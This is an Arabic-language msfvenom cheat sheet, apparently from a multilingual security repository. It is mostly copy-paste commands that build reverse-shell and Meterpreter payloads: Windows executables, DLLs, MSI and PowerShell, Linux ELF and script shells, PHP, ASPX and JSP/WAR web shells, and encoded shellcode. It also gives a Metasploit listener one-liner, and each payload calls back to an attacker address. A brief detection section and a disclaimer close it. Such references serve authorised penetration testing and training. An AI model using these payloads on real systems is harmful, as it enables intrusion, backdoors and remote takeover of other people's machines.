<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 💣 مسفينوم - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ███╗███████╗███████╗██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗
  ████╗ ████║██╔════╝██╔════╝██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║
  ██╔████╔██║███████╗█████╗  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
  ██║╚██╔╝██║╚════██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
  ██║ ╚═╝ ██║███████║██║      ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
  ╚═╝     ╚═╝╚══════╝╚═╝       ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
         Metasploit Standalone Payload Generator & Shellcode Encoder
```
<p align="center">
  <img src="https://img.shields.io/badge/Msfvenom-Payload_Generator-blue?style=for-the-badge" alt="Msfvenom">
  <img src="https://img.shields.io/badge/Framework-Metasploit-red?style=for-the-badge" alt="Metasploit">
  <img src="https://img.shields.io/badge/Category-Exploit_Payloads-green?style=for-the-badge" alt="Payloads">
  <img src="https://img.shields.io/badge/Output-Binaries_%7C_Shellcode_%7C_Scripts-purple?style=for-the-badge" alt="التنسيقات">
</ص>

<p align="center">
  <b>💣 ورقة الغش الرئيسية لإنشاء حمولات مستقلة وأكواد القشرة والأبواب الخلفية عبر أنظمة التشغيل Windows وLinux وmacOS وAndroid والويب</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وهندسة الحمولة](#-نظرة عامة--بنية الحمولة)
  - [الحمولات المرحلية مقابل الحمولات غير المرحلية](#الحمولات المرحلية مقابل الحمولات غير المرحلية)
- [الإشارات والخيارات الأساسية](#-الأعلام الأساسية--الخيارات)
- [حمولات Windows (EXE، DLL، MSI، PowerShell)](#-windows-payloads-exe-dll-msi-powershell)
- [حمولات Linux وUnix (ELF وPython وBash)](#-linux--unix-payloads-elf-python-bash)
- [حمولات الويب وWeb Shell (PHP، ASP، ASPX، JSP، WAR)](#-web--web-shell-payloads-php-asp-aspx-jsp-war)
- [إنشاء كود القشرة لتطوير برمجيات إكسبلويت (C، Raw، Python)](#-إنشاء كود القشرة-for-exploit-development-c-raw-python)
  - [تجريد الأحرف السيئة (`-b`)](#stripping-bad-characters--b)
  - [أجهزة التشفير والتكرارات المتعددة (`-e`، `-i`)](#encoders--multiple-iterations--e--i)
- [الإعداد السريع لمعالج متعدد Metasploit](#-metasploit-multi-handler-quick-setup)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وهندسة الحمولة

من خلال الجمع بين الأدوات المساعدة الكلاسيكية `msfpayload` و`msfencode`، يقوم **msfvenom** بإنشاء ملفات ثنائية قابلة للتنفيذ ونصوص برمجية وأكواد قشرة أولية للاستغلال واختبار الاختراق.

### الحمولات المرحلية مقابل الحمولات غير المرحلية
- **منظم (على سبيل المثال، `windows/x64/meterpreter/reverse_tcp`):**
  يستخدم خطوط مائلة بين المكونات. يتصل كعب صغير (المرحلة 0) مرة أخرى بالمستمع ويجلب ملف DLL العاكس الكامل (المرحلة 1) إلى الذاكرة. مثالية لبرامج الاستغلال ذات الحدود الصارمة لطول المخزن المؤقت.
- **بدون مراحل (مثل `windows/x64/meterpreter_reverse_tcp`):**
  يستخدم الشرطة السفلية (`_`). الحمولة النافعة لـ Meterpreter بأكملها مستقلة داخل الملف القابل للتنفيذ أو كود القشرة. يعمل بشكل موثوق دون الاعتماد على مصافحة الشبكة متعددة المراحل، مما يجعله مثاليًا لمشغلي سطر الأوامر والمراوغة المستمرة.

---

## ⚙️ الأعلام والخيارات الأساسية
```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT_FILE>
```
| علم | الوصف |
|------|------------|
| `-p, --payload` | يحدد الحمولة المراد استخدامها (`--list payloads` لعرض الكل). |
| `-f, --format` | تنسيق الإخراج (exe، elf، الخام، c، python، asp، aspx، war، php). |
| `-e, --encoder` | برنامج تشفير Shellcode للتخلص من الأحرف السيئة (`--list encoders`). |
| `-i, --iterations` | عدد مرات الترميز |
| `-b, --bad-chars` | الأحرف التي يجب تجنبها في كود القشرة (على سبيل المثال، `\x00\x0a\x0d`). |
| `-x, --template` | قالب قابل للتنفيذ لحقن الحمولة في. |
| `-k, --keep` | يحافظ على التنفيذ الطبيعي للقالب في موضوع جديد. |
| `-o, --out` | مسار ملف وجهة الإخراج. |

---

## 🪟 حمولات Windows (EXE وDLL وMSI وPowerShell)

### Windows x64 Reverse Shell القابل للتنفيذ (بدون مراحل)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```
### Windows x64 Staged Reverse TCP القابل للتنفيذ
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o staged.exe
```
### حمولة حقن Windows DLL
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o payload.dll
```
### مثبت Windows MSI (تصعيد الامتياز عبر AlwaysInstallElevated)
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o install.msi
```
### أمر PowerShell المشفر باستخدام Base64
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f psh-cmd -o run.bat
```
---

## 🐧 حمولات Linux وUnix (ELF وPython وBash)

### Linux x64 ELF ثنائي (بدون مراحل)
```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```
### Linux Standard `/bin/sh` Reverse TCP (بدون مقياس)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o reverse.elf
```
### برنامج Python Reverse Shell النصي المستقل
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.py
```
### سلسلة أوامر Bash نقية
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.sh
```
---

## 🌐 حمولات الويب وWeb Shell (PHP، ASP، ASPX، JSP، WAR)

### PHP المترجم العكسي Shell
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
```
### ASP وASPX الكلاسيكي (خوادم IIS)
```bash
# Classic ASP
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f asp -o shell.asp

# Modern ASPX (.NET)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```
### حزمة Java WAR (أرشيف ويب Apache Tomcat)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o webshell.war
```
---

## 🔬 إنشاء كود القشرة لتطوير برمجيات إكسبلويت (C، Raw، Python)

### إزالة الشخصيات السيئة (`-b`)
البايتات الخالية (`\x00`)، وإرجاع السطر (`\r` = `\x0d`)، والأسطر الجديدة (`\n` = `\x0a`) تعمل على كسر عمليات استغلال تلف الذاكرة المستندة إلى السلسلة (على سبيل المثال، تجاوزات المكدس):
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -b '\x00\x0a\x0d' -f c -o shellcode.c
```
### أجهزة التشفير والتكرارات المتعددة (`-e`، `-i`)
```bash
# Polymorphic XOR additive feedback encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -b '\x00' -f raw -o payload.bin
```
---

## 🎧 الإعداد السريع لمعالج Metasploit المتعدد

قم دائمًا بالتقاط الحمولات باستخدام Metasploit's `multi/handler`:
```bash
# One-liner handler startup
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```
---

## ⚡ جدول مرجعي سريع

| منصة الهدف | الأمر |
|-----------------|---------|
| **ويندوز x64 EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o run.exe` |
| **لينكس x64 قزم** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o run.elf` |
| ** PHP ويب شل ** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` |
| ** ASPX (.NET IIS) ** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` |
| ** حرب القط ** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war` |
| ** كود القشرة الخام (C) **| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -b '\x00' -f c` |
| **PowerShell One-Liner**| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f psh-cmd` |

---

## 🛡️ الاعتبارات الدفاعية والكشوفات

1. **الكشف عن التوقيع الثابت:** تحتوي قوالب Msfvenom وأجهزة التشفير الافتراضية (`shikata_ga_nai`) على توقيعات ثابتة معروفة تم تحديدها بواسطة كل محركات مكافحة الفيروسات الحديثة تقريبًا.
2. **مراقبة EDR السلوكية:** تشير عوامل EDR إلى عملية إنتاج غير طبيعية (على سبيل المثال، `cmd.exe` أو `powershell.exe` التي تم إنتاجها تحت `w3wp.exe` أو `tomcat8.exe`).

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> يقوم Msfvenom بإنشاء حمولات هجومية وظيفية وأبواب خلفية. ويجب استخدامه بشكل صارم أثناء اختبارات الاختراق المصرح بها وداخل بيئات الأبحاث المعملية المعزولة. يعد الإنشاء أو التنفيذ غير المصرح به على أجهزة كمبيوتر تابعة لجهات خارجية أمرًا غير قانوني.